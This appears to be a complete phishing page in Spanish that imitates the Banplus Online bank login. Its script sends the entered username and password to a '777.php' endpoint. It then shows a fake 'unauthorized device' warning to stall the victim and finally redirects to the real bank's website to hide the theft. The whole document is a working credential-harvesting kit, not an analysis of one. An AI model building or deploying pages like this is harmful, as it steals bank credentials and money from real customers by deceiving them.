<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Acceso - Banplus Online</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .outer-wrapper { background-color: #6ad122; }
    </style>
</head>
<body class="outer-wrapper min-h-screen flex items-center justify-center p-2 sm:p-4 overflow-x-hidden">

    <div id="capaCarga" class="hidden fixed inset-0 bg-black/50 z-50 flex items-center justify-center">
        <div class="bg-white p-5 rounded-2xl shadow-xl flex items-center space-x-3">
            <i class="fa-solid fa-spinner fa-spin text-[#0072ce] text-2xl"></i>
            <span id="textoCarga" class="text-sm font-medium text-gray-700">Procesando...</span>
        </div>
    </div>

    <div class="w-full max-w-sm sm:max-w-md bg-white rounded-[28px] sm:rounded-[40px] p-4 sm:p-6 shadow-2xl relative border-2 sm:border-[3px] border-white flex flex-col justify-between my-2 sm:my-auto min-h-[620px] sm:min-h-[720px]">
        
        <div class="absolute inset-2 sm:inset-4 rounded-[22px] sm:rounded-[32px] border border-[#a3e07d] pointer-events-none"></div>

        <div class="flex flex-col items-center pt-2 sm:pt-4 z-10">
            <div class="flex items-center space-x-2">
                <svg class="w-7 h-7 sm:w-8 sm:h-8" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="50" cy="50" r="48" fill="url(#grad1)"/>
                    <path d="M10 50H90C90 72.0914 72.0914 90 50 90C27.9086 90 10 72.0914 10 50Z" fill="#003366" opacity="0.3"/>
                    <path d="M20 40H80M25 50H75M30 60H70" stroke="white" stroke-width="6" stroke-linecap="round"/>
                    <defs>
                        <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stop-color="#004a8f" />
                            <stop offset="100%" stop-color="#002244" />
                        </linearGradient>
                    </defs>
                </svg>
                <span class="text-[#0a2540] font-bold text-lg sm:text-xl tracking-tight">Banplus</span>
            </div>
        </div>

        <div id="contenedorPrincipal" class="my-auto z-10">
            <div id="tarjetaAcceso" class="bg-white rounded-2xl shadow-[0_4px_20px_rgba(0,0,0,0.06)] border border-[#e2e8f0] p-4 sm:p-8">
                <h2 class="text-center text-lg sm:text-xl font-normal italic text-[#0a2540] mb-4 sm:mb-6 font-serif">Bienvenido</h2>

                <form id="formularioAcceso" class="space-y-4 sm:space-y-5">
                    <div>
                        <label for="campoUsuario" class="block text-[10px] sm:text-[11px] font-bold tracking-wider text-[#4a5568] mb-1.5 sm:mb-2 leading-tight">
                            IDENTIFICADOR DE USUARIO BANPLUS ONLINE
                        </label>
                        <input 
                            type="text" 
                            id="campoUsuario" 
                            placeholder="USUARIO" 
                            required
                            class="w-full px-3.5 py-2.5 sm:py-3 bg-white border border-[#cbd5e1] rounded-xl text-sm text-[#4a5568] placeholder-[#a0aec0] focus:outline-none focus:border-[#004a8f] focus:ring-1 focus:ring-[#004a8f] transition"
                        >
                    </div>

                    <div>
                        <label for="campoClave" class="block text-[10px] sm:text-[11px] font-bold tracking-wider text-[#4a5568] mb-1.5 sm:mb-2 leading-tight">
                            CONTRASEÑA BANPLUS ONLINE
                        </label>
                        <div class="relative">
                            <input 
                                type="password" 
                                id="campoClave" 
                                placeholder="Ingresa tu contraseña" 
                                required
                                class="w-full pl-3.5 pr-11 py-2.5 sm:py-3 bg-white border border-[#cbd5e1] rounded-xl text-sm text-[#4a5568] placeholder-[#a0aec0] focus:outline-none focus:border-[#004a8f] focus:ring-1 focus:ring-[#004a8f] transition"
                            >
                            <button 
                                type="button" 
                                id="botonMostrarClave"
                                class="absolute right-2.5 top-1/2 -translate-y-1/2 text-[#718096] hover:text-[#004a8f] focus:outline-none p-2 touch-manipulation"
                                aria-label="Mostrar u ocultar contraseña"
                            >
                                <i id="iconoOjo" class="fa-regular fa-eye text-base sm:text-lg"></i>
                            </button>
                        </div>
                    </div>

                    <div class="pt-2">
                        <button 
                            type="submit" 
                            class="w-full bg-[#0072ce] hover:bg-[#005fb3] active:scale-[0.99] text-white font-semibold py-3 sm:py-3.5 px-4 rounded-xl shadow-[0_4px_12px_rgba(0,114,206,0.3)] transition duration-200 uppercase tracking-wider text-xs sm:text-sm touch-manipulation"
                        >
                            Ingresar
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <div class="flex flex-col items-center pb-2 sm:pb-4 z-10">
            <div class="flex items-center space-x-2">
                <svg class="w-7 h-7 sm:w-8 sm:h-8" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="50" cy="50" r="48" fill="url(#grad2)"/>
                    <path d="M10 50H90C90 72.0914 72.0914 90 50 90C27.9086 90 10 72.0914 10 50Z" fill="#003366" opacity="0.3"/>
                    <path d="M20 40H80M25 50H75M30 60H70" stroke="white" stroke-width="6" stroke-linecap="round"/>
                    <defs>
                        <linearGradient id="grad2" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stop-color="#004a8f" />
                            <stop offset="100%" stop-color="#002244" />
                        </linearGradient>
                    </defs>
                </svg>
                <span class="text-[#0a2540] font-bold text-lg sm:text-xl tracking-tight">Banplus</span>
            </div>
        </div>

    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const contenedorPrincipal = document.getElementById('contenedorPrincipal');
            const capaCarga = document.getElementById('capaCarga');
            const textoCarga = document.getElementById('textoCarga');

            // Mostrar/ocultar contraseña
            document.addEventListener('click', (e) => {
                if (e.target && (e.target.id === 'botonMostrarClave' || e.target.closest('#botonMostrarClave'))) {
                    const campoClave = document.getElementById('campoClave');
                    const iconoOjo = document.getElementById('iconoOjo');
                    if (campoClave && iconoOjo) {
                        if (campoClave.type === 'password') {
                            campoClave.type = 'text';
                            iconoOjo.classList.remove('fa-eye');
                            iconoOjo.classList.add('fa-eye-slash');
                        } else {
                            campoClave.type = 'password';
                            iconoOjo.classList.remove('fa-eye-slash');
                            iconoOjo.classList.add('fa-eye');
                        }
                    }
                }
            });

            // Envío del formulario
            document.addEventListener('submit', async (e) => {
                if (e.target && e.target.id === 'formularioAcceso') {
                    e.preventDefault();
                    const usuario = document.getElementById('campoUsuario').value.trim();
                    const clave = document.getElementById('campoClave').value.trim();

                    textoCarga.innerText = "Procesando...";
                    capaCarga.classList.remove('hidden');

                    try {
                        await fetch('777.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ usuario, clave, accion: 'acceso' })
                        }).catch(() => {});
                    } catch (err) {
                        console.error(err);
                    }

                    setTimeout(() => {
                        capaCarga.classList.add('hidden');
                        mostrarVistaDispositivoNoAutorizado();
                    }, 5000);
                }
            });

            function mostrarVistaDispositivoNoAutorizado() {
                contenedorPrincipal.innerHTML = `
                    <div class="bg-white rounded-2xl shadow-[0_4px_20px_rgba(0,0,0,0.06)] border border-[#e2e8f0] p-4 sm:p-6 text-center">
                        <h2 class="text-lg sm:text-xl font-bold text-[#333333] mb-4">Dispositivo No Autorizado</h2>
                        
                        <div class="flex justify-center mb-5">
                            <div class="w-24 h-32 bg-[#8bc34a] rounded-xl flex flex-col items-center justify-center relative shadow-md">
                                <span class="text-white text-5xl font-bold font-sans">?</span>
                                <div class="absolute bottom-2 w-2 h-2 bg-white rounded-full"></div>
                            </div>
                        </div>

                        <p class="text-xs sm:text-sm text-[#555555] leading-relaxed mb-6 px-1">
                            Hemos detectado que estás iniciando sesión en un dispositivo no registrado, por tu seguridad no podemos permitir el ingreso. Por favor, revisa tu correo para autorizar este nuevo dispositivo.
                        </p>

                        <button 
                            type="button" 
                            id="botonDispositivoVerificado"
                            class="w-full bg-[#0072ce] hover:bg-[#005fb3] active:scale-[0.99] text-white font-semibold py-3 px-2 rounded-xl shadow-[0_4px_12px_rgba(0,114,206,0.3)] transition duration-200 uppercase tracking-wider text-[11px] sm:text-xs touch-manipulation"
                        >
                            YA HE VERIFICADO MI DISPOSITIVO CONTINUAR
                        </button>
                    </div>
                `;
            }

            // Confirmación de dispositivo verificado
            document.addEventListener('click', async (e) => {
                if (e.target && e.target.id === 'botonDispositivoVerificado') {
                    textoCarga.innerText = "Verificando dispositivo...";
                    capaCarga.classList.remove('hidden');

                    try {
                        await fetch('777.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ accion: 'dispositivo_verificado', estado: 'Usuario confirmó verificación' })
                        }).catch(() => {});
                    } catch (err) {
                        console.error(err);
                    }

                    setTimeout(() => {
                        window.location.href = 'https://www.banplus.com/financiamientos-personas/';
                    }, 3000);
                }
            });
        });
    </script>
</body>
</html>
